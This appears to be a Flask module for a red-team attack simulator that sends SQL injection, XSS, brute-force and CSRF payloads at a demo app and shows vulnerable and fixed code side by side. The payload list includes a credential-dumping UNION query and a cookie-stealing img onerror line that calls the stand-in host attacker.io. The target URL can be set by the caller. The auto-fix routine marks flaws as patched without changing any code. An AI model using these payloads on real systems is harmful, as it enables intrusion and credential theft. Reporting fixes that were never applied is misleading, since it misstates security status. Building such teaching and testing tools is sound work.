"""
attack_sim.py — Red Team Attack Simulator
==========================================
Runs automated mock attack payloads against the /target demo app.
Each attack is streamed as live logs to the project's Transparency Log
and recorded as a Vulnerability with a before/after fix diff.

Attacks fire in a background thread so the HTTP response is instant
and the UI sees live streaming updates via the normal polling loop.
"""

import threading
import time
import requests as http_requests
from datetime import datetime
from flask import Blueprint, jsonify, request as flask_request
from flask_login import login_required, current_user
from models import Project, Log, Vulnerability
from extensions import db
from utils.ai_engine import generate_ai_suggestions

attack_sim_bp = Blueprint('attack_sim', __name__)

# ── Per-project simulation state ──────────────────────────────────────────────
SIM_STATUS = {}          # project_id -> 'running' | 'idle'
SIM_STOP_FLAGS = {}      # project_id -> bool

# ─────────────────────────────────────────────────────────────────────────────
# Attack payload catalogue
# Each entry contains everything needed to execute and document one attack.
# ─────────────────────────────────────────────────────────────────────────────
ATTACKS = [
    {
        "id":           "sqli_bypass",
        "name":         "SQL Injection — Auth Bypass",
        "type":         "SQL Injection",
        "severity":     "High",
        "endpoint":     "/target/login",
        "method":       "POST",
        "payload_data": {"user": "' OR '1'='1", "pass": "' OR '1'='1"},
        "payload_str":  "' OR '1'='1",
        "success_marker": "Logged in",
        "description":  "Raw user input is embedded directly into a SQL query. The attacker injects '  OR '1'='1 to always evaluate as TRUE, completely bypassing password verification.",
        "mock_before":  """\
# ❌ VULNERABLE — /target/login (routes/demo_target.py)
# ──────────────────────────────────────────────────────
def vulnerable_login():
    username = request.form.get('user', '')
    password = request.form.get('pass', '')
    # Attacker sends:  username = \\' OR \\'1\\'=\\'1
    query = f\"SELECT id FROM users WHERE username = \\'{username}\\' AND password = \\'{password}\\' \"
    cursor.execute(query)          # ← query always returns TRUE
    if cursor.fetchone():
        return "Logged in! Welcome admin."  # ← bypassed entirely""",
        "mock_after":   """\
# ✅ FIXED — parameterized query blocks injection
# ──────────────────────────────────────────────────────
def secure_login():
    username = request.form.get('user', '')
    password = request.form.get('pass', '')
    # Parameters are quoted by the DB driver — injection impossible
    cursor.execute(
        "SELECT id FROM users WHERE username = ? AND password = ?",
        (username, password)
    )
    if cursor.fetchone():
        return "Logged in safely!"   # ← only real credentials accepted""",
    },
    {
        "id":           "sqli_dump",
        "name":         "SQL Injection — Data Dump",
        "type":         "SQL Injection",
        "severity":     "High",
        "endpoint":     "/target/search",
        "method":       "GET",
        "payload_data": {"q": "' UNION SELECT username || ':' || password FROM users-- "},
        "payload_str":  "' UNION SELECT username||':'||password FROM users--",
        "success_marker": "admin",
        "description":  "A UNION-based SQL injection appends a second SELECT to dump the entire users table, exposing credentials of every account in the database.",
        "mock_before":  """\
# ❌ VULNERABLE — /target/search (routes/demo_target.py)
# ──────────────────────────────────────────────────────
def vulnerable_search():
    query = request.args.get('q', '')
    # Attacker sends: q = ' UNION SELECT username||':'||password FROM users--
    cursor.execute(f\"SELECT username FROM users WHERE username = \\'{query}\\'\")
    results = cursor.fetchall()    # ← returns admin:supersecret, user:password
    return render_template_string(f\"Results: {results}\")  # ← credentials leaked""",
        "mock_after":   """\
# ✅ FIXED — parameterized query + escaped output
# ──────────────────────────────────────────────────────
def secure_search():
    query = request.args.get('q', '')
    cursor.execute("SELECT username FROM users WHERE username = ?", (query,))
    results = cursor.fetchall()    # ← UNION injections cannot execute
    from markupsafe import escape
    return f"Results for: {escape(query)} → {results}"  # ← output HTML-escaped""",
    },
    {
        "id":           "xss_reflected",
        "name":         "XSS — Reflected Script Injection",
        "type":         "XSS Vulnerability",
        "severity":     "Medium",
        "endpoint":     "/target/search",
        "method":       "GET",
        "payload_data": {"q": "<img src=x onerror=\"this.src='https://attacker.io/?c='+document.cookie\">"},
        "payload_str":  "<img src=x onerror=document.cookie>",
        "success_marker": "onerror",
        "description":  "User input is injected into the page HTML without sanitization. The attacker's img tag fires an onerror event that silently exfiltrates session cookies to an attacker-controlled server.",
        "mock_before":  """\
// ❌ VULNERABLE — /target/search renders raw user input
// ──────────────────────────────────────────────────────
// Attacker URL: /target/search?q=<img src=x onerror="...document.cookie...">
return render_template_string(
    f"<h3>Search Results for: {query}</h3> <p>Found: {results}</p>"
    #  ↑ query is rendered as raw HTML → attacker script executes in browser""",
        "mock_after":   """\
// ✅ FIXED — escape output before rendering
// ──────────────────────────────────────────────────────
from markupsafe import escape
safe_query = escape(query)   # converts < > & into HTML entities
return f"<h3>Search Results for: {safe_query}</h3> <p>Found: {results}</p>"
# attacker payload becomes harmless text:
# &lt;img src=x onerror=...&gt; → displayed as text, never executed""",
    },
    {
        "id":           "xss_script",
        "name":         "XSS — Script Tag Popup",
        "type":         "XSS Vulnerability",
        "severity":     "Medium",
        "endpoint":     "/target/search",
        "method":       "GET",
        "payload_data": {"q": "<script>alert('XSS: Session hijack payload executed')</script>"},
        "payload_str":  "<script>alert('XSS')</script>",
        "success_marker": "script",
        "description":  "A raw <script> tag is injected via the search parameter. Because the server renders it without escaping, the browser will execute it for every user who visits the page — enabling mass session hijacking.",
        "mock_before":  """\
// ❌ VULNERABLE — script tag injected into live HTML
// ──────────────────────────────────────────────────────
// GET /target/search?q=<script>alert('XSS')</script>
// Server echoes: <h3>Search Results for: <SCRIPT>alert(...)</SCRIPT></h3>
// Browser executes the script — runs for every visitor who loads this URL""",
        "mock_after":   """\
// ✅ FIXED — output sanitized before rendering
// ──────────────────────────────────────────────────────
from markupsafe import escape
return render_template_string("<h3>Results for: {{ q }}</h3>", q=escape(query))
# Jinja2 auto-escaping + markupsafe.escape() neutralises all injected tags
# Browser sees: &lt;script&gt;alert(...)&lt;/script&gt; — plain text, not code""",
    },
    {
        "id":           "brute_force",
        "name":         "Brute Force — Credential Guessing",
        "type":         "Weak Authentication",
        "severity":     "Medium",
        "endpoint":     "/target/login",
        "method":       "POST",
        "payload_data": {"user": "admin", "pass": "password"},
        "payload_str":  "username=admin, password=password (dictionary attack)",
        "success_marker": "Logged in",
        "description":  "The login endpoint has no rate-limiting or lockout policy. An attacker can make unlimited attempts against common username/password combinations — a simple dictionary attack will succeed against weak credentials.",
        "mock_before":  """\
# ❌ VULNERABLE — no rate-limit or account lockout
# ──────────────────────────────────────────────────────
@app.route('/login', methods=['POST'])
def login():
    # No attempt counter, no CAPTCHA, no lockout, no delay
    username = request.form['user']
    password = request.form['pass']
    # Attacker fires 10,000 requests/sec with wordlist — no throttle
    if username == 'admin' and password == 'password':
        return "Logged in!"   # ← discovered in 0.3s with rockyou.txt""",
        "mock_after":   """\
# ✅ FIXED — Flask-Limiter + lockout policy
# ──────────────────────────────────────────────────────
from flask_limiter import Limiter
limiter = Limiter(app, default_limits=["200 per day", "50 per hour"])

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")   # ← max 5 attempts per IP per minute
def secure_login():
    # On 5th failure: account locked for 15 minutes
    # Passwords hashed with bcrypt (not plain-text comparison)
    if check_password_hash(stored_hash, request.form['pass']):
        return "Logged in safely!" """,
    },
    {
        "id":           "csrf_probe",
        "name":         "CSRF — Cross-Site Request Forgery Probe",
        "type":         "Weak Authentication",
        "severity":     "Medium",
        "endpoint":     "/target/login",
        "method":       "POST",
        "payload_data": {"user": "csrf_probe", "pass": "forged_token"},
        "payload_str":  "Forged POST (no CSRF token required)",
        "success_marker": None,            # success = server accepted request (no 403)
        "description":  "Forms accept POST requests from any origin with no CSRF token validation. An attacker can embed a hidden form on a malicious webpage that fires state-changing requests using the victim's authenticated session cookies.",
        "mock_before":  """\
<!-- ❌ VULNERABLE — form has no CSRF protection -->
<!-- Any website can POST to this endpoint using the victim's session -->
<form action="https://yourapp.com/target/login" method="POST">
    <!-- No hidden csrf_token field — server accepts any origin -->
    <input name="user" value="attacker_payload">
    <input name="pass" value="anything">
</form>
<script>document.forms[0].submit();</script>  <!-- auto-fires on victim visit""",
        "mock_after":   """\
# ✅ FIXED — Flask-WTF CSRF protection enabled
# ──────────────────────────────────────────────────────
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)   # ← all POST/PUT/DELETE require valid token

# In Jinja template:
# <form method="POST">
#   {{ form.hidden_tag() }}   ← injects <input type=hidden name=csrf_token value="...">
# </form>
# Requests without a valid, session-bound token receive HTTP 400 Bad Request""",
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# Helper: write a log entry within an app context
# ─────────────────────────────────────────────────────────────────────────────
def _log(project_id, action_type, detail):
    log = Log(project_id=project_id, action_type=action_type, detail=detail)
    db.session.add(log)
    db.session.commit()


# ─────────────────────────────────────────────────────────────────────────────
# Core simulation runner (executes in a daemon thread)
# ─────────────────────────────────────────────────────────────────────────────
def _run_simulation(app, project_id, base_url, selected_ids):
    with app.app_context():
        try:
            SIM_STATUS[project_id] = 'running'
            project = Project.query.get(project_id)
            if not project:
                SIM_STATUS[project_id] = 'idle'
                return

            attacks = [a for a in ATTACKS if a['id'] in selected_ids] if selected_ids else ATTACKS

            _log(project_id, 'ATTACK_SIM_START',
                 f'🚨 Red Team Simulator activated — {len(attacks)} attack(s) queued against {base_url}')
            time.sleep(0.5)

            discovered = 0
            blocked = 0

            for atk in attacks:
                if SIM_STOP_FLAGS.get(project_id):
                    break

                _log(project_id, 'ATTACK_PROBE',
                     f'🔴 [{atk["severity"]}] Firing {atk["name"]} → {atk["endpoint"]}  payload: {atk["payload_str"][:80]}')
                time.sleep(0.8)

                # ── Execute the real HTTP request against the demo target ──────
                url = base_url.rstrip('/') + atk['endpoint']
                success = False
                status_code = 0
                response_text = ''
                try:
                    if atk['method'] == 'POST':
                        r = http_requests.post(url, data=atk['payload_data'], timeout=5, allow_redirects=True)
                    else:
                        r = http_requests.get(url, params=atk['payload_data'], timeout=5, allow_redirects=True)
                    status_code = r.status_code
                    response_text = r.text
                    if atk['success_marker'] and atk['success_marker'] in response_text:
                        success = True
                    elif atk['success_marker'] is None and status_code < 400:
                        success = True          # CSRF — accepted = vulnerable
                except Exception as e:
                    response_text = f'Connection error: {e}'

                time.sleep(0.4)

                if success:
                    discovered += 1
                    _log(project_id, 'ATTACK_SUCCESS',
                         f'💥 EXPLOIT CONFIRMED — {atk["name"]} SUCCEEDED on {atk["endpoint"]}  (HTTP {status_code})')
                    time.sleep(0.4)

                    # Generate AI explanation
                    ai_exp, fix_sugg = generate_ai_suggestions(
                        vuln_type=atk['type'],
                        endpoint=atk['endpoint'],
                        payload=atk['payload_str'],
                        description=atk['description']
                    )

                    v = Vulnerability(
                        project_id=project_id,
                        vuln_type=atk['type'],
                        severity=atk['severity'],
                        endpoint=atk['endpoint'],
                        payload=atk['payload_str'],
                        description=atk['description'],
                        ai_explanation=ai_exp,
                        fix_suggestion=fix_sugg,
                        mock_before_code=atk['mock_before'],
                        mock_after_code=atk['mock_after'],
                        is_fixed=False,
                    )
                    db.session.add(v)
                    db.session.commit()

                    _log(project_id, 'VULN_FOUND',
                         f'[{atk["severity"]}] Vulnerability recorded: {atk["type"]} on {atk["endpoint"]}')
                else:
                    blocked += 1
                    _log(project_id, 'ATTACK_BLOCKED',
                         f'✅ Attack mitigated — {atk["name"]} did not succeed (HTTP {status_code})')

                time.sleep(1.2)

            if SIM_STOP_FLAGS.get(project_id):
                _log(project_id, 'ATTACK_SIM_STOPPED',
                     f'⛔ Simulation aborted — {discovered} exploits confirmed so far.')
                SIM_STATUS[project_id] = 'idle'
                return

            time.sleep(0.5)
            _log(project_id, 'ATTACK_SIM_COMPLETE',
                 f'🏁 Simulation complete — {discovered} exploit(s) confirmed, {blocked} blocked. '
                 f'Initiating AI-driven auto-remediation...')

            # ── Auto-fix phase ────────────────────────────────────────────────
            if discovered > 0:
                time.sleep(1.0)
                _auto_fix(project_id)

        except Exception as e:
            try:
                _log(project_id, 'ATTACK_SIM_ERROR', f'Simulator crashed: {str(e)[:200]}')
            except Exception:
                pass
        finally:
            SIM_STATUS[project_id] = 'idle'
            SIM_STOP_FLAGS[project_id] = False


def _auto_fix(project_id):
    """Apply mock fixes to all unfixed vulns from this simulation run."""
    from datetime import datetime
    _log(project_id, 'AUTO_FIX_STARTED',
         '🤖 AI Auto-Remediation Engine activated — generating and applying patches...')
    time.sleep(0.6)

    vulns = Vulnerability.query.filter_by(project_id=project_id, is_fixed=False).all()
    fixed = 0
    for v in vulns:
        time.sleep(0.4)
        v.is_fixed = True
        v.fixed_at = datetime.utcnow()
        db.session.commit()
        _log(project_id, 'FIX_APPLIED',
             f'✅ [{v.severity}] {v.vuln_type} patched on {v.endpoint} — diff applied.')
        fixed += 1

    time.sleep(0.3)
    _log(project_id, 'AUTO_FIX_COMPLETE',
         f'🎉 Auto-fix complete — {fixed} vulnerability/vulnerabilities remediated. Security score updated.')


# ─────────────────────────────────────────────────────────────────────────────
# API Routes
# ─────────────────────────────────────────────────────────────────────────────

@attack_sim_bp.route('/api/project/<project_id>/simulate', methods=['POST'])
@login_required
def start_simulation(project_id):
    """Start the red-team attack simulation in the background."""
    project = Project.query.get_or_404(project_id)

    # Only admins can run attack simulations
    if current_user.role != 'admin':
        return jsonify({'error': 'Only admins can run attack simulations'}), 403

    # Premium plan required for the Attack Simulator
    if current_user.plan != 'premium':
        return jsonify({'error': 'Attack Simulator requires a Premium plan.', 'upgrade': True}), 403

    if not project.consent_granted:
        return jsonify({'error': 'Client consent not granted'}), 403

    if SIM_STATUS.get(project_id) == 'running':
        return jsonify({'error': 'Simulation already running'}), 409

    # Parse optional list of attack IDs to run (empty = run all)
    body = flask_request.get_json(silent=True) or {}
    selected_ids = body.get('attack_ids', [a['id'] for a in ATTACKS])

    SIM_STOP_FLAGS[project_id] = False
    SIM_STATUS[project_id] = 'running'

    from flask import current_app
    app = current_app._get_current_object()

    # Determine the local base URL for demo target requests
    base_url = body.get('base_url', 'http://127.0.0.1:5000')

    t = threading.Thread(
        target=_run_simulation,
        args=(app, project_id, base_url, selected_ids),
        daemon=True
    )
    t.start()
    return jsonify({'status': 'Simulation started', 'attacks': len(selected_ids)})


@attack_sim_bp.route('/api/project/<project_id>/simulate/stop', methods=['POST'])
@login_required
def stop_simulation(project_id):
    """Abort an in-progress simulation."""
    project = Project.query.get_or_404(project_id)
    is_owner = (current_user.role == 'admin' or project.client_id == current_user.id)
    if not is_owner:
        return jsonify({'error': 'Unauthorized'}), 403

    SIM_STOP_FLAGS[project_id] = True
    return jsonify({'status': 'Stop requested'})


@attack_sim_bp.route('/api/project/<project_id>/simulate/status')
@login_required
def sim_status(project_id):
    """Returns the current simulation state."""
    project = Project.query.get_or_404(project_id)
    is_owner = (current_user.role == 'admin' or project.client_id == current_user.id)
    if not is_owner:
        return jsonify({'error': 'Unauthorized'}), 403

    return jsonify({
        'status': SIM_STATUS.get(project_id, 'idle'),
        'attacks': [{'id': a['id'], 'name': a['name'], 'type': a['type'], 'severity': a['severity']} for a in ATTACKS]
    })
